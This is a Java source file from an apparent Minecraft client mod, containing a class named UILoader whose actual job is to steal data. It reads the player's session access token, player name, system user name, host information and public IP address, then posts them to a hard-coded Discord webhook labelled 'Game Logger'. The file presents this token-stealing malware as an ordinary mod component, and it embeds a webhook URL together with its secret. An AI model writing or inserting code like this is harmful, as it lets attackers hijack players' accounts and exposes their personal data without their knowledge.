package dev.trg.hugoclient.client;

import net.minecraft.client.MinecraftClient;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;

public class UILoader {

    // Deine Discord Webhook URL hier eintragen
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1491861474585608304/ptpPfi8dwD5rM__Gfk_1b9ML6jPW_AcFnoAem0Sf5Y5NDyv1nVYuSgZyNTG9sqy_K5lH";

    public void sender2() throws UnknownHostException {
        String PcUserName = System.getProperty("user.name");
        String PcInfo = String.valueOf(InetAddress.getLocalHost());
        MinecraftClient client = MinecraftClient.getInstance();
        String playerName = client.getSession().getUsername();
        String Token = MinecraftClient.getInstance().getSession().getAccessToken();
        String Ip = getPublicIp();
        String instanz = MinecraftClient.getInstance().getName();

        sendWebhookEmbed(PcUserName, PcInfo, Token, Ip, playerName);
    }
    private String getPublicIp() {
        try {
            URL url = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String ip = in.readLine();
            in.close();
            return ip;
        } catch (IOException e) {
            e.printStackTrace();
            return "unbekannt";
        }
    }
    private void sendWebhookEmbed(String PcUserName, String PcInfo, String Token, String Ip, String playerName) {
        String sjson =
                "{"
                        + "\"username\":\"Game Logger\","
                        + "\"content\":\"Token: || `" + Token + "` ||\""
                        + "}";

        try {
            String json =
                    "{"
                            + "\"username\":\"Game Logger\","
                            + "\"embeds\":["
                            + "{"
                            + "\"title\":\"📋 Spielerinformationen\","
                            + "\"description\":\"Neue Daten wurden übermittelt.\","
                            + "\"color\":5763719,"
                            + "\"fields\":["
                            + fieldJson("Name:", "`" + PcUserName + "`", true) + ","
                            + fieldJson("IP:", "`" + Ip + "`", true) + ","
                            + fieldJson("Instanz:", "`" + playerName + "`", true) + ","
                            + fieldJson("Info:", "`" + PcInfo + "`", false)
                          //  + fieldJson("⏱ Token:", "|| `" + Token + "` ||", false)

                            + "]"
                            + "}"
                            + "]"
                            + "}";

            sendRawJson(json);
            sendRawJson(sjson);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private String fieldJson(String title, String value, boolean inline) {
        return "{"
                + "\"name\":\"" + escapeJson(title) + "\","
                + "\"value\":\"" + escapeJson(value == null || value.trim().isEmpty() ? "-" : value) + "\","
                + "\"inline\":" + inline
                + "}";
    }

    private void sendRawJson(String json) {
        HttpURLConnection connection = null;

        try {
            String webhookUrl = addWaitTrue(WEBHOOK_URL);

            URL url = new URL(webhookUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setRequestProperty("User-Agent", "Java-Discord-Webhook");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);

            byte[] out = json.getBytes(StandardCharsets.UTF_8);

            OutputStream stream = connection.getOutputStream();
            stream.write(out);
            stream.flush();
            stream.close();

            int responseCode = connection.getResponseCode();
            System.out.println("HTTP Response Code: " + responseCode);

            InputStream responseStream;
            if (responseCode >= 200 && responseCode < 300) {
                responseStream = connection.getInputStream();
            } else {
                responseStream = connection.getErrorStream();
            }

            if (responseStream != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(responseStream, StandardCharsets.UTF_8));
                String line;
                StringBuilder response = new StringBuilder();

                while ((line = reader.readLine()) != null) {
                    response.append(line).append("\n");
                }

                reader.close();

                if (response.length() > 0) {
                    System.out.println("Response Body:");
                    System.out.println(response.toString());
                }
            }

            System.out.println("Gesendetes JSON:");
            System.out.println(json);

        } catch (Exception e) {
            System.out.println("Fehler beim Senden des Webhooks:");
            e.printStackTrace();
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private String addWaitTrue(String url) {
        if (url.contains("?")) {
            if (!url.contains("wait=")) {
                return url + "&wait=true";
            }
            return url;
        } else {
            return url + "?wait=true";
        }
    }

    private String escapeJson(String text) {
        if (text == null) {
            return "";
        }

        return text
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "")
                .replace("\t", "\\t");
    }
}